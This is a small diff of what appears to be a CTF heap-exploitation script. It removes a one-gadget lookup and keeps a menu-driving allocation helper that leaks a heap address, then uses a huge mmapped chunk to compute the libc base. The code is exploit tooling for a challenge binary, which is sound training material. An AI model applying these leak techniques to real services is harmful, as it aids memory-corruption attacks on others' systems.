@@ -3,8 +3,6 @@ from helper import *
 import helper
 abbre(globals(), io, loader) # 此处定义了常用的缩写
 
-loader.get_og()
-
 def add(size, content):
     sla(b'2:puts\n', '1')
     sla(b'size\n', str(size))
@@ -12,8 +10,6 @@ def add(size, content):
     heap = int(r(14), 16)
     sla(b'content\n', content)
     return heap
-
-
 
 mmaped = add(0x200000, 'aaa')
 helper.utils.easy_libc(libc, addr=mmaped+0x200ff0)
